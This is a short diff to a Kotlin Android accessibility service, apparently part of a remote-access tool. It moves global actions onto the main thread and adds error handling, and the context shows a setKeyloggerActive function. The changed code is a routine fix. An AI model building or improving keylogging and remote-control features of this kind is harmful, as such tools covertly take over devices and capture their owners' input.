@@ -163,7 +163,30 @@ class RemoteAccessibilityService : AccessibilityService() {
 
         fun performAction(actionId: Int): Boolean {
             val service = instance ?: return false
-            return service.performGlobalAction(actionId)
+            if (android.os.Looper.myLooper() == android.os.Looper.getMainLooper()) {
+                return try {
+                    service.performGlobalAction(actionId)
+                } catch (e: Exception) {
+                    android.util.Log.e("RemoteAccessibilityService", "Error performing global action $actionId: ${e.message}")
+                    false
+                }
+            } else {
+                val latch = java.util.concurrent.CountDownLatch(1)
+                var result = false
+                android.os.Handler(android.os.Looper.getMainLooper()).post {
+                    try {
+                        result = service.performGlobalAction(actionId)
+                    } catch (e: Exception) {
+                        android.util.Log.e("RemoteAccessibilityService", "Error performing global action $actionId on main thread: ${e.message}")
+                    } finally {
+                        latch.countDown()
+                    }
+                }
+                try {
+                    latch.await(2, java.util.concurrent.TimeUnit.SECONDS)
+                } catch (_: Exception) {}
+                return result
+            }
         }
 
         fun setKeyloggerActive(active: Boolean): Boolean {
